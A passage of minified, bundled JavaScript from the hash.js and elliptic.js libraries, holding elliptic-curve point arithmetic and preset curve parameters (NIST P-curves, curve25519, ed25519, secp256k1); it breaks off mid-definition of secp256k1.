this.inner.update(i,s),this},r.prototype.digest=function(i){return this.outer.update(this.inner.digest()),this.outer.digest(i)},nm}var r1;function VK(){return r1||(r1=1,function(t){var e=t;e.utils=Ki(),e.common=Eh(),e.sha=HK(),e.ripemd=WK(),e.hmac=GK(),e.sha1=e.sha.sha1,e.sha256=e.sha.sha256,e.sha224=e.sha.sha224,e.sha384=e.sha.sha384,e.sha512=e.sha.sha512,e.ripemd160=e.ripemd.ripemd160}(Kg)),Kg}var KK=VK();const Pi=co(KK);function Vc(t,e,r){return r={path:e,exports:{},require:function(n,i){return QK(n,i??r.path)}},t(r,r.exports),r.exports}function QK(){throw new Error("Dynamic requires are not currently supported by @rollup/plugin-commonjs")}var Xy=Gx;function Gx(t,e){if(!t)throw new Error(e||"Assertion failed")}Gx.equal=function(e,r,n){if(e!=r)throw new Error(n||"Assertion failed: "+e+" != "+r)};var fi=Vc(function(t,e){var r=e;function n(o,a){if(Array.isArray(o))return o.slice();if(!o)return[];var c=[];if(typeof o!="string"){for(var u=0;u<o.length;u++)c[u]=o[u]|0;return c}if(a==="hex"){o=o.replace(/[^a-z0-9]+/ig,""),o.length%2!==0&&(o="0"+o);for(var u=0;u<o.length;u+=2)c.push(parseInt(o[u]+o[u+1],16))}else for(var u=0;u<o.length;u++){var l=o.charCodeAt(u),h=l>>8,d=l&255;h?c.push(h,d):c.push(d)}return c}r.toArray=n;function i(o){return o.length===1?"0"+o:o}r.zero2=i;function s(o){for(var a="",c=0;c<o.length;c++)a+=i(o[c].toString(16));return a}r.toHex=s,r.encode=function(a,c){return c==="hex"?s(a):a}}),kn=Vc(function(t,e){var r=e;r.assert=Xy,r.toArray=fi.toArray,r.zero2=fi.zero2,r.toHex=fi.toHex,r.encode=fi.encode;function n(c,u,l){var h=new Array(Math.max(c.bitLength(),l)+1),d;for(d=0;d<h.length;d+=1)h[d]=0;var g=1<<u+1,y=c.clone();for(d=0;d<h.length;d++){var m,b=y.andln(g-1);y.isOdd()?(b>(g>>1)-1?m=(g>>1)-b:m=b,y.isubn(m)):m=0,h[d]=m,y.iushrn(1)}return h}r.getNAF=n;function i(c,u){var l=[[],[]];c=c.clone(),u=u.clone();for(var h=0,d=0,g;c.cmpn(-h)>0||u.cmpn(-d)>0;){var y=c.andln(3)+h&3,m=u.andln(3)+d&3;y===3&&(y=-1),m===3&&(m=-1);var b;(y&1)===0?b=0:(g=c.andln(7)+h&7,(g===3||g===5)&&m===2?b=-y:b=y),l[0].push(b);var A;(m&1)===0?A=0:(g=u.andln(7)+d&7,(g===3||g===5)&&y===2?A=-m:A=m),l[1].push(A),2*h===b+1&&(h=1-h),2*d===A+1&&(d=1-d),c.iushrn(1),u.iushrn(1)}return l}r.getJSF=i;function s(c,u,l){var h="_"+u;c.prototype[u]=function(){return this[h]!==void 0?this[h]:this[h]=l.call(this)}}r.cachedProperty=s;function o(c){return typeof c=="string"?r.toArray(c,"hex"):c}r.parseBytes=o;function a(c){return new Ce(c,"hex","le")}r.intFromLE=a}),pf=kn.getNAF,YK=kn.getJSF,gf=kn.assert;function lo(t,e){this.type=t,this.p=new Ce(e.p,16),this.red=e.prime?Ce.red(e.prime):Ce.mont(this.p),this.zero=new Ce(0).toRed(this.red),this.one=new Ce(1).toRed(this.red),this.two=new Ce(2).toRed(this.red),this.n=e.n&&new Ce(e.n,16),this.g=e.g&&this.pointFromJSON(e.g,e.gRed),this._wnafT1=new Array(4),this._wnafT2=new Array(4),this._wnafT3=new Array(4),this._wnafT4=new Array(4),this._bitLength=this.n?this.n.bitLength():0;var r=this.n&&this.p.div(this.n);!r||r.cmpn(100)>0?this.redN=null:(this._maxwellTrick=!0,this.redN=this.n.toRed(this.red))}var _a=lo;lo.prototype.point=function(){throw new Error("Not implemented")};lo.prototype.validate=function(){throw new Error("Not implemented")};lo.prototype._fixedNafMul=function(e,r){gf(e.precomputed);var n=e._getDoubles(),i=pf(r,1,this._bitLength),s=(1<<n.step+1)-(n.step%2===0?2:1);s/=3;var o=[],a,c;for(a=0;a<i.length;a+=n.step){c=0;for(var u=a+n.step-1;u>=a;u--)c=(c<<1)+i[u];o.push(c)}for(var l=this.jpoint(null,null,null),h=this.jpoint(null,null,null),d=s;d>0;d--){for(a=0;a<o.length;a++)c=o[a],c===d?h=h.mixedAdd(n.points[a]):c===-d&&(h=h.mixedAdd(n.points[a].neg()));l=l.add(h)}return l.toP()};lo.prototype._wnafMul=function(e,r){var n=4,i=e._getNAFPoints(n);n=i.wnd;for(var s=i.points,o=pf(r,n,this._bitLength),a=this.jpoint(null,null,null),c=o.length-1;c>=0;c--){for(var u=0;c>=0&&o[c]===0;c--)u++;if(c>=0&&u++,a=a.dblp(u),c<0)break;var l=o[c];gf(l!==0),e.type==="affine"?l>0?a=a.mixedAdd(s[l-1>>1]):a=a.mixedAdd(s[-l-1>>1].neg()):l>0?a=a.add(s[l-1>>1]):a=a.add(s[-l-1>>1].neg())}return e.type==="affine"?a.toP():a};lo.prototype._wnafMulAdd=function(e,r,n,i,s){var o=this._wnafT1,a=this._wnafT2,c=this._wnafT3,u=0,l,h,d;for(l=0;l<i;l++){d=r[l];var g=d._getNAFPoints(e);o[l]=g.wnd,a[l]=g.points}for(l=i-1;l>=1;l-=2){var y=l-1,m=l;if(o[y]!==1||o[m]!==1){c[y]=pf(n[y],o[y],this._bitLength),c[m]=pf(n[m],o[m],this._bitLength),u=Math.max(c[y].length,u),u=Math.max(c[m].length,u);continue}var b=[r[y],null,null,r[m]];r[y].y.cmp(r[m].y)===0?(b[1]=r[y].add(r[m]),b[2]=r[y].toJ().mixedAdd(r[m].neg())):r[y].y.cmp(r[m].y.redNeg())===0?(b[1]=r[y].toJ().mixedAdd(r[m]),b[2]=r[y].add(r[m].neg())):(b[1]=r[y].toJ().mixedAdd(r[m]),b[2]=r[y].toJ().mixedAdd(r[m].neg()));var A=[-3,-1,-5,-7,0,7,5,1,3],_=YK(n[y],n[m]);for(u=Math.max(_[0].length,u),c[y]=new Array(u),c[m]=new Array(u),h=0;h<u;h++){var T=_[0][h]|0,P=_[1][h]|0;c[y][h]=A[(T+1)*3+(P+1)],c[m][h]=0,a[y]=b}}var S=this.jpoint(null,null,null),C=this._wnafT4;for(l=u;l>=0;l--){for(var O=0;l>=0;){var $=!0;for(h=0;h<i;h++)C[h]=c[h][l]|0,C[h]!==0&&($=!1);if(!$)break;O++,l--}if(l>=0&&O++,S=S.dblp(O),l<0)break;for(h=0;h<i;h++){var D=C[h];D!==0&&(D>0?d=a[h][D-1>>1]:D<0&&(d=a[h][-D-1>>1].neg()),d.type==="affine"?S=S.mixedAdd(d):S=S.add(d))}}for(l=0;l<i;l++)a[l]=null;return s?S:S.toP()};function Jn(t,e){this.curve=t,this.type=e,this.precomputed=null}lo.BasePoint=Jn;Jn.prototype.eq=function(){throw new Error("Not implemented")};Jn.prototype.validate=function(){return this.curve.validate(this)};lo.prototype.decodePoint=function(e,r){e=kn.toArray(e,r);var n=this.p.byteLength();if((e[0]===4||e[0]===6||e[0]===7)&&e.length-1===2*n){e[0]===6?gf(e[e.length-1]%2===0):e[0]===7&&gf(e[e.length-1]%2===1);var i=this.point(e.slice(1,1+n),e.slice(1+n,1+2*n));return i}else if((e[0]===2||e[0]===3)&&e.length-1===n)return this.pointFromX(e.slice(1,1+n),e[0]===3);throw new Error("Unknown point format")};Jn.prototype.encodeCompressed=function(e){return this.encode(e,!0)};Jn.prototype._encode=function(e){var r=this.curve.p.byteLength(),n=this.getX().toArray("be",r);return e?[this.getY().isEven()?2:3].concat(n):[4].concat(n,this.getY().toArray("be",r))};Jn.prototype.encode=function(e,r){return kn.encode(this._encode(r),e)};Jn.prototype.precompute=function(e){if(this.precomputed)return this;var r={doubles:null,naf:null,beta:null};return r.naf=this._getNAFPoints(8),r.doubles=this._getDoubles(4,e),r.beta=this._getBeta(),this.precomputed=r,this};Jn.prototype._hasDoubles=function(e){if(!this.precomputed)return!1;var r=this.precomputed.doubles;return r?r.points.length>=Math.ceil((e.bitLength()+1)/r.step):!1};Jn.prototype._getDoubles=function(e,r){if(this.precomputed&&this.precomputed.doubles)return this.precomputed.doubles;for(var n=[this],i=this,s=0;s<r;s+=e){for(var o=0;o<e;o++)i=i.dbl();n.push(i)}return{step:e,points:n}};Jn.prototype._getNAFPoints=function(e){if(this.precomputed&&this.precomputed.naf)return this.precomputed.naf;for(var r=[this],n=(1<<e)-1,i=n===1?null:this.dbl(),s=1;s<n;s++)r[s]=r[s-1].add(i);return{wnd:e,points:r}};Jn.prototype._getBeta=function(){return null};Jn.prototype.dblp=function(e){for(var r=this,n=0;n<e;n++)r=r.dbl();return r};var ew=Vc(function(t){typeof Object.create=="function"?t.exports=function(r,n){n&&(r.super_=n,r.prototype=Object.create(n.prototype,{constructor:{value:r,enumerable:!1,writable:!0,configurable:!0}}))}:t.exports=function(r,n){if(n){r.super_=n;var i=function(){};i.prototype=n.prototype,r.prototype=new i,r.prototype.constructor=r}}}),JK=kn.assert;function Zn(t){_a.call(this,"short",t),this.a=new Ce(t.a,16).toRed(this.red),this.b=new Ce(t.b,16).toRed(this.red),this.tinv=this.two.redInvm(),this.zeroA=this.a.fromRed().cmpn(0)===0,this.threeA=this.a.fromRed().sub(this.p).cmpn(-3)===0,this.endo=this._getEndomorphism(t),this._endoWnafT1=new Array(4),this._endoWnafT2=new Array(4)}ew(Zn,_a);var ZK=Zn;Zn.prototype._getEndomorphism=function(e){if(!(!this.zeroA||!this.g||!this.n||this.p.modn(3)!==1)){var r,n;if(e.beta)r=new Ce(e.beta,16).toRed(this.red);else{var i=this._getEndoRoots(this.p);r=i[0].cmp(i[1])<0?i[0]:i[1],r=r.toRed(this.red)}if(e.lambda)n=new Ce(e.lambda,16);else{var s=this._getEndoRoots(this.n);this.g.mul(s[0]).x.cmp(this.g.x.redMul(r))===0?n=s[0]:(n=s[1],JK(this.g.mul(n).x.cmp(this.g.x.redMul(r))===0))}var o;return e.basis?o=e.basis.map(function(a){return{a:new Ce(a.a,16),b:new Ce(a.b,16)}}):o=this._getEndoBasis(n),{beta:r,lambda:n,basis:o}}};Zn.prototype._getEndoRoots=function(e){var r=e===this.p?this.red:Ce.mont(e),n=new Ce(2).toRed(r).redInvm(),i=n.redNeg(),s=new Ce(3).toRed(r).redNeg().redSqrt().redMul(n),o=i.redAdd(s).fromRed(),a=i.redSub(s).fromRed();return[o,a]};Zn.prototype._getEndoBasis=function(e){for(var r=this.n.ushrn(Math.floor(this.n.bitLength()/2)),n=e,i=this.n.clone(),s=new Ce(1),o=new Ce(0),a=new Ce(0),c=new Ce(1),u,l,h,d,g,y,m,b=0,A,_;n.cmpn(0)!==0;){var T=i.div(n);A=i.sub(T.mul(n)),_=a.sub(T.mul(s));var P=c.sub(T.mul(o));if(!h&&A.cmp(r)<0)u=m.neg(),l=s,h=A.neg(),d=_;else if(h&&++b===2)break;m=A,i=n,n=A,a=s,s=_,c=o,o=P}g=A.neg(),y=_;var S=h.sqr().add(d.sqr()),C=g.sqr().add(y.sqr());return C.cmp(S)>=0&&(g=u,y=l),h.negative&&(h=h.neg(),d=d.neg()),g.negative&&(g=g.neg(),y=y.neg()),[{a:h,b:d},{a:g,b:y}]};Zn.prototype._endoSplit=function(e){var r=this.endo.basis,n=r[0],i=r[1],s=i.b.mul(e).divRound(this.n),o=n.b.neg().mul(e).divRound(this.n),a=s.mul(n.a),c=o.mul(i.a),u=s.mul(n.b),l=o.mul(i.b),h=e.sub(a).sub(c),d=u.add(l).neg();return{k1:h,k2:d}};Zn.prototype.pointFromX=function(e,r){e=new Ce(e,16),e.red||(e=e.toRed(this.red));var n=e.redSqr().redMul(e).redIAdd(e.redMul(this.a)).redIAdd(this.b),i=n.redSqrt();if(i.redSqr().redSub(n).cmp(this.zero)!==0)throw new Error("invalid point");var s=i.fromRed().isOdd();return(r&&!s||!r&&s)&&(i=i.redNeg()),this.point(e,i)};Zn.prototype.validate=function(e){if(e.inf)return!0;var r=e.x,n=e.y,i=this.a.redMul(r),s=r.redSqr().redMul(r).redIAdd(i).redIAdd(this.b);return n.redSqr().redISub(s).cmpn(0)===0};Zn.prototype._endoWnafMulAdd=function(e,r,n){for(var i=this._endoWnafT1,s=this._endoWnafT2,o=0;o<e.length;o++){var a=this._endoSplit(r[o]),c=e[o],u=c._getBeta();a.k1.negative&&(a.k1.ineg(),c=c.neg(!0)),a.k2.negative&&(a.k2.ineg(),u=u.neg(!0)),i[o*2]=c,i[o*2+1]=u,s[o*2]=a.k1,s[o*2+1]=a.k2}for(var l=this._wnafMulAdd(1,i,s,o*2,n),h=0;h<o*2;h++)i[h]=null,s[h]=null;return l};function xr(t,e,r,n){_a.BasePoint.call(this,t,"affine"),e===null&&r===null?(this.x=null,this.y=null,this.inf=!0):(this.x=new Ce(e,16),this.y=new Ce(r,16),n&&(this.x.forceRed(this.curve.red),this.y.forceRed(this.curve.red)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.inf=!1)}ew(xr,_a.BasePoint);Zn.prototype.point=function(e,r,n){return new xr(this,e,r,n)};Zn.prototype.pointFromJSON=function(e,r){return xr.fromJSON(this,e,r)};xr.prototype._getBeta=function(){if(this.curve.endo){var e=this.precomputed;if(e&&e.beta)return e.beta;var r=this.curve.point(this.x.redMul(this.curve.endo.beta),this.y);if(e){var n=this.curve,i=function(s){return n.point(s.x.redMul(n.endo.beta),s.y)};e.beta=r,r.precomputed={beta:null,naf:e.naf&&{wnd:e.naf.wnd,points:e.naf.points.map(i)},doubles:e.doubles&&{step:e.doubles.step,points:e.doubles.points.map(i)}}}return r}};xr.prototype.toJSON=function(){return this.precomputed?[this.x,this.y,this.precomputed&&{doubles:this.precomputed.doubles&&{step:this.precomputed.doubles.step,points:this.precomputed.doubles.points.slice(1)},naf:this.precomputed.naf&&{wnd:this.precomputed.naf.wnd,points:this.precomputed.naf.points.slice(1)}}]:[this.x,this.y]};xr.fromJSON=function(e,r,n){typeof r=="string"&&(r=JSON.parse(r));var i=e.point(r[0],r[1],n);if(!r[2])return i;function s(a){return e.point(a[0],a[1],n)}var o=r[2];return i.precomputed={beta:null,doubles:o.doubles&&{step:o.doubles.step,points:[i].concat(o.doubles.points.map(s))},naf:o.naf&&{wnd:o.naf.wnd,points:[i].concat(o.naf.points.map(s))}},i};xr.prototype.inspect=function(){return this.isInfinity()?"<EC Point Infinity>":"<EC Point x: "+this.x.fromRed().toString(16,2)+" y: "+this.y.fromRed().toString(16,2)+">"};xr.prototype.isInfinity=function(){return this.inf};xr.prototype.add=function(e){if(this.inf)return e;if(e.inf)return this;if(this.eq(e))return this.dbl();if(this.neg().eq(e))return this.curve.point(null,null);if(this.x.cmp(e.x)===0)return this.curve.point(null,null);var r=this.y.redSub(e.y);r.cmpn(0)!==0&&(r=r.redMul(this.x.redSub(e.x).redInvm()));var n=r.redSqr().redISub(this.x).redISub(e.x),i=r.redMul(this.x.redSub(n)).redISub(this.y);return this.curve.point(n,i)};xr.prototype.dbl=function(){if(this.inf)return this;var e=this.y.redAdd(this.y);if(e.cmpn(0)===0)return this.curve.point(null,null);var r=this.curve.a,n=this.x.redSqr(),i=e.redInvm(),s=n.redAdd(n).redIAdd(n).redIAdd(r).redMul(i),o=s.redSqr().redISub(this.x.redAdd(this.x)),a=s.redMul(this.x.redSub(o)).redISub(this.y);return this.curve.point(o,a)};xr.prototype.getX=function(){return this.x.fromRed()};xr.prototype.getY=function(){return this.y.fromRed()};xr.prototype.mul=function(e){return e=new Ce(e,16),this.isInfinity()?this:this._hasDoubles(e)?this.curve._fixedNafMul(this,e):this.curve.endo?this.curve._endoWnafMulAdd([this],[e]):this.curve._wnafMul(this,e)};xr.prototype.mulAdd=function(e,r,n){var i=[this,r],s=[e,n];return this.curve.endo?this.curve._endoWnafMulAdd(i,s):this.curve._wnafMulAdd(1,i,s,2)};xr.prototype.jmulAdd=function(e,r,n){var i=[this,r],s=[e,n];return this.curve.endo?this.curve._endoWnafMulAdd(i,s,!0):this.curve._wnafMulAdd(1,i,s,2,!0)};xr.prototype.eq=function(e){return this===e||this.inf===e.inf&&(this.inf||this.x.cmp(e.x)===0&&this.y.cmp(e.y)===0)};xr.prototype.neg=function(e){if(this.inf)return this;var r=this.curve.point(this.x,this.y.redNeg());if(e&&this.precomputed){var n=this.precomputed,i=function(s){return s.neg()};r.precomputed={naf:n.naf&&{wnd:n.naf.wnd,points:n.naf.points.map(i)},doubles:n.doubles&&{step:n.doubles.step,points:n.doubles.points.map(i)}}}return r};xr.prototype.toJ=function(){if(this.inf)return this.curve.jpoint(null,null,null);var e=this.curve.jpoint(this.x,this.y,this.curve.one);return e};function Lr(t,e,r,n){_a.BasePoint.call(this,t,"jacobian"),e===null&&r===null&&n===null?(this.x=this.curve.one,this.y=this.curve.one,this.z=new Ce(0)):(this.x=new Ce(e,16),this.y=new Ce(r,16),this.z=new Ce(n,16)),this.x.red||(this.x=this.x.toRed(this.curve.red)),this.y.red||(this.y=this.y.toRed(this.curve.red)),this.z.red||(this.z=this.z.toRed(this.curve.red)),this.zOne=this.z===this.curve.one}ew(Lr,_a.BasePoint);Zn.prototype.jpoint=function(e,r,n){return new Lr(this,e,r,n)};Lr.prototype.toP=function(){if(this.isInfinity())return this.curve.point(null,null);var e=this.z.redInvm(),r=e.redSqr(),n=this.x.redMul(r),i=this.y.redMul(r).redMul(e);return this.curve.point(n,i)};Lr.prototype.neg=function(){return this.curve.jpoint(this.x,this.y.redNeg(),this.z)};Lr.prototype.add=function(e){if(this.isInfinity())return e;if(e.isInfinity())return this;var r=e.z.redSqr(),n=this.z.redSqr(),i=this.x.redMul(r),s=e.x.redMul(n),o=this.y.redMul(r.redMul(e.z)),a=e.y.redMul(n.redMul(this.z)),c=i.redSub(s),u=o.redSub(a);if(c.cmpn(0)===0)return u.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var l=c.redSqr(),h=l.redMul(c),d=i.redMul(l),g=u.redSqr().redIAdd(h).redISub(d).redISub(d),y=u.redMul(d.redISub(g)).redISub(o.redMul(h)),m=this.z.redMul(e.z).redMul(c);return this.curve.jpoint(g,y,m)};Lr.prototype.mixedAdd=function(e){if(this.isInfinity())return e.toJ();if(e.isInfinity())return this;var r=this.z.redSqr(),n=this.x,i=e.x.redMul(r),s=this.y,o=e.y.redMul(r).redMul(this.z),a=n.redSub(i),c=s.redSub(o);if(a.cmpn(0)===0)return c.cmpn(0)!==0?this.curve.jpoint(null,null,null):this.dbl();var u=a.redSqr(),l=u.redMul(a),h=n.redMul(u),d=c.redSqr().redIAdd(l).redISub(h).redISub(h),g=c.redMul(h.redISub(d)).redISub(s.redMul(l)),y=this.z.redMul(a);return this.curve.jpoint(d,g,y)};Lr.prototype.dblp=function(e){if(e===0)return this;if(this.isInfinity())return this;if(!e)return this.dbl();var r;if(this.curve.zeroA||this.curve.threeA){var n=this;for(r=0;r<e;r++)n=n.dbl();return n}var i=this.curve.a,s=this.curve.tinv,o=this.x,a=this.y,c=this.z,u=c.redSqr().redSqr(),l=a.redAdd(a);for(r=0;r<e;r++){var h=o.redSqr(),d=l.redSqr(),g=d.redSqr(),y=h.redAdd(h).redIAdd(h).redIAdd(i.redMul(u)),m=o.redMul(d),b=y.redSqr().redISub(m.redAdd(m)),A=m.redISub(b),_=y.redMul(A);_=_.redIAdd(_).redISub(g);var T=l.redMul(c);r+1<e&&(u=u.redMul(g)),o=b,c=T,l=_}return this.curve.jpoint(o,l.redMul(s),c)};Lr.prototype.dbl=function(){return this.isInfinity()?this:this.curve.zeroA?this._zeroDbl():this.curve.threeA?this._threeDbl():this._dbl()};Lr.prototype._zeroDbl=function(){var e,r,n;if(this.zOne){var i=this.x.redSqr(),s=this.y.redSqr(),o=s.redSqr(),a=this.x.redAdd(s).redSqr().redISub(i).redISub(o);a=a.redIAdd(a);var c=i.redAdd(i).redIAdd(i),u=c.redSqr().redISub(a).redISub(a),l=o.redIAdd(o);l=l.redIAdd(l),l=l.redIAdd(l),e=u,r=c.redMul(a.redISub(u)).redISub(l),n=this.y.redAdd(this.y)}else{var h=this.x.redSqr(),d=this.y.redSqr(),g=d.redSqr(),y=this.x.redAdd(d).redSqr().redISub(h).redISub(g);y=y.redIAdd(y);var m=h.redAdd(h).redIAdd(h),b=m.redSqr(),A=g.redIAdd(g);A=A.redIAdd(A),A=A.redIAdd(A),e=b.redISub(y).redISub(y),r=m.redMul(y.redISub(e)).redISub(A),n=this.y.redMul(this.z),n=n.redIAdd(n)}return this.curve.jpoint(e,r,n)};Lr.prototype._threeDbl=function(){var e,r,n;if(this.zOne){var i=this.x.redSqr(),s=this.y.redSqr(),o=s.redSqr(),a=this.x.redAdd(s).redSqr().redISub(i).redISub(o);a=a.redIAdd(a);var c=i.redAdd(i).redIAdd(i).redIAdd(this.curve.a),u=c.redSqr().redISub(a).redISub(a);e=u;var l=o.redIAdd(o);l=l.redIAdd(l),l=l.redIAdd(l),r=c.redMul(a.redISub(u)).redISub(l),n=this.y.redAdd(this.y)}else{var h=this.z.redSqr(),d=this.y.redSqr(),g=this.x.redMul(d),y=this.x.redSub(h).redMul(this.x.redAdd(h));y=y.redAdd(y).redIAdd(y);var m=g.redIAdd(g);m=m.redIAdd(m);var b=m.redAdd(m);e=y.redSqr().redISub(b),n=this.y.redAdd(this.z).redSqr().redISub(d).redISub(h);var A=d.redSqr();A=A.redIAdd(A),A=A.redIAdd(A),A=A.redIAdd(A),r=y.redMul(m.redISub(e)).redISub(A)}return this.curve.jpoint(e,r,n)};Lr.prototype._dbl=function(){var e=this.curve.a,r=this.x,n=this.y,i=this.z,s=i.redSqr().redSqr(),o=r.redSqr(),a=n.redSqr(),c=o.redAdd(o).redIAdd(o).redIAdd(e.redMul(s)),u=r.redAdd(r);u=u.redIAdd(u);var l=u.redMul(a),h=c.redSqr().redISub(l.redAdd(l)),d=l.redISub(h),g=a.redSqr();g=g.redIAdd(g),g=g.redIAdd(g),g=g.redIAdd(g);var y=c.redMul(d).redISub(g),m=n.redAdd(n).redMul(i);return this.curve.jpoint(h,y,m)};Lr.prototype.trpl=function(){if(!this.curve.zeroA)return this.dbl().add(this);var e=this.x.redSqr(),r=this.y.redSqr(),n=this.z.redSqr(),i=r.redSqr(),s=e.redAdd(e).redIAdd(e),o=s.redSqr(),a=this.x.redAdd(r).redSqr().redISub(e).redISub(i);a=a.redIAdd(a),a=a.redAdd(a).redIAdd(a),a=a.redISub(o);var c=a.redSqr(),u=i.redIAdd(i);u=u.redIAdd(u),u=u.redIAdd(u),u=u.redIAdd(u);var l=s.redIAdd(a).redSqr().redISub(o).redISub(c).redISub(u),h=r.redMul(l);h=h.redIAdd(h),h=h.redIAdd(h);var d=this.x.redMul(c).redISub(h);d=d.redIAdd(d),d=d.redIAdd(d);var g=this.y.redMul(l.redMul(u.redISub(l)).redISub(a.redMul(c)));g=g.redIAdd(g),g=g.redIAdd(g),g=g.redIAdd(g);var y=this.z.redAdd(a).redSqr().redISub(n).redISub(c);return this.curve.jpoint(d,g,y)};Lr.prototype.mul=function(e,r){return e=new Ce(e,r),this.curve._wnafMul(this,e)};Lr.prototype.eq=function(e){if(e.type==="affine")return this.eq(e.toJ());if(this===e)return!0;var r=this.z.redSqr(),n=e.z.redSqr();if(this.x.redMul(n).redISub(e.x.redMul(r)).cmpn(0)!==0)return!1;var i=r.redMul(this.z),s=n.redMul(e.z);return this.y.redMul(s).redISub(e.y.redMul(i)).cmpn(0)===0};Lr.prototype.eqXToP=function(e){var r=this.z.redSqr(),n=e.toRed(this.curve.red).redMul(r);if(this.x.cmp(n)===0)return!0;for(var i=e.clone(),s=this.curve.redN.redMul(r);;){if(i.iadd(this.curve.n),i.cmp(this.curve.p)>=0)return!1;if(n.redIAdd(s),this.x.cmp(n)===0)return!0}};Lr.prototype.inspect=function(){return this.isInfinity()?"<EC JPoint Infinity>":"<EC JPoint x: "+this.x.toString(16,2)+" y: "+this.y.toString(16,2)+" z: "+this.z.toString(16,2)+">"};Lr.prototype.isInfinity=function(){return this.z.cmpn(0)===0};var Ad=Vc(function(t,e){var r=e;r.base=_a,r.short=ZK,r.mont=null,r.edwards=null}),_d=Vc(function(t,e){var r=e,n=kn.assert;function i(a){a.type==="short"?this.curve=new Ad.short(a):a.type==="edwards"?this.curve=new Ad.edwards(a):this.curve=new Ad.mont(a),this.g=this.curve.g,this.n=this.curve.n,this.hash=a.hash,n(this.g.validate(),"Invalid curve"),n(this.g.mul(this.n).isInfinity(),"Invalid curve, G*N != O")}r.PresetCurve=i;function s(a,c){Object.defineProperty(r,a,{configurable:!0,enumerable:!0,get:function(){var u=new i(c);return Object.defineProperty(r,a,{configurable:!0,enumerable:!0,value:u}),u}})}s("p192",{type:"short",prime:"p192",p:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff",a:"ffffffff ffffffff ffffffff fffffffe ffffffff fffffffc",b:"64210519 e59c80e7 0fa7e9ab 72243049 feb8deec c146b9b1",n:"ffffffff ffffffff ffffffff 99def836 146bc9b1 b4d22831",hash:Pi.sha256,gRed:!1,g:["188da80e b03090f6 7cbf20eb 43a18800 f4ff0afd 82ff1012","07192b95 ffc8da78 631011ed 6b24cdd5 73f977a1 1e794811"]}),s("p224",{type:"short",prime:"p224",p:"ffffffff ffffffff ffffffff ffffffff 00000000 00000000 00000001",a:"ffffffff ffffffff ffffffff fffffffe ffffffff ffffffff fffffffe",b:"b4050a85 0c04b3ab f5413256 5044b0b7 d7bfd8ba 270b3943 2355ffb4",n:"ffffffff ffffffff ffffffff ffff16a2 e0b8f03e 13dd2945 5c5c2a3d",hash:Pi.sha256,gRed:!1,g:["b70e0cbd 6bb4bf7f 321390b9 4a03c1d3 56c21122 343280d6 115c1d21","bd376388 b5f723fb 4c22dfe6 cd4375a0 5a074764 44d58199 85007e34"]}),s("p256",{type:"short",prime:null,p:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff ffffffff",a:"ffffffff 00000001 00000000 00000000 00000000 ffffffff ffffffff fffffffc",b:"5ac635d8 aa3a93e7 b3ebbd55 769886bc 651d06b0 cc53b0f6 3bce3c3e 27d2604b",n:"ffffffff 00000000 ffffffff ffffffff bce6faad a7179e84 f3b9cac2 fc632551",hash:Pi.sha256,gRed:!1,g:["6b17d1f2 e12c4247 f8bce6e5 63a440f2 77037d81 2deb33a0 f4a13945 d898c296","4fe342e2 fe1a7f9b 8ee7eb4a 7c0f9e16 2bce3357 6b315ece cbb64068 37bf51f5"]}),s("p384",{type:"short",prime:null,p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 ffffffff",a:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe ffffffff 00000000 00000000 fffffffc",b:"b3312fa7 e23ee7e4 988e056b e3f82d19 181d9c6e fe814112 0314088f 5013875a c656398d 8a2ed19d 2a85c8ed d3ec2aef",n:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff c7634d81 f4372ddf 581a0db2 48b0a77a ecec196a ccc52973",hash:Pi.sha384,gRed:!1,g:["aa87ca22 be8b0537 8eb1c71e f320ad74 6e1d3b62 8ba79b98 59f741e0 82542a38 5502f25d bf55296c 3a545e38 72760ab7","3617de4a 96262c6f 5d9e98bf 9292dc29 f8f41dbd 289a147c e9da3113 b5f0b8c0 0a60b1ce 1d7e819d 7a431d7c 90ea0e5f"]}),s("p521",{type:"short",prime:null,p:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff",a:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffc",b:"00000051 953eb961 8e1c9a1f 929a21a0 b68540ee a2da725b 99b315f3 b8b48991 8ef109e1 56193951 ec7e937b 1652c0bd 3bb1bf07 3573df88 3d2c34f1 ef451fd4 6b503f00",n:"000001ff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffa 51868783 bf2f966b 7fcc0148 f709a5d0 3bb5c9b8 899c47ae bb6fb71e 91386409",hash:Pi.sha512,gRed:!1,g:["000000c6 858e06b7 0404e9cd 9e3ecb66 2395b442 9c648139 053fb521 f828af60 6b4d3dba a14b5e77 efe75928 fe1dc127 a2ffa8de 3348b3c1 856a429b f97e7e31 c2e5bd66","00000118 39296a78 9a3bc004 5c8a5fb4 2c7d1bd9 98f54449 579b4468 17afbd17 273e662c 97ee7299 5ef42640 c550b901 3fad0761 353c7086 a272c240 88be9476 9fd16650"]}),s("curve25519",{type:"mont",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"76d06",b:"1",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:Pi.sha256,gRed:!1,g:["9"]}),s("ed25519",{type:"edwards",prime:"p25519",p:"7fffffffffffffff ffffffffffffffff ffffffffffffffff ffffffffffffffed",a:"-1",c:"1",d:"52036cee2b6ffe73 8cc740797779e898 00700a4d4141d8ab 75eb4dca135978a3",n:"1000000000000000 0000000000000000 14def9dea2f79cd6 5812631a5cf5d3ed",hash:Pi.sha256,gRed:!1,g:["216936d3cd6e53fec0a4e231fdd6dc5c692cc7609525a7b2c9562d608f25d51a","6666666666666666666666666666666666666666666666666666666666666658"]});var o;try{o=null.crash()}catch{o=void 0}s("secp256k1",{type:"short",prime:"k256",p:"ffffffff ffffffff ffffffff ffffffff ffffffff ffffffff fffffffe fffffc2f",a:"0",b:"7",n:"ffffffff ffffffff ffffffff fffffffe 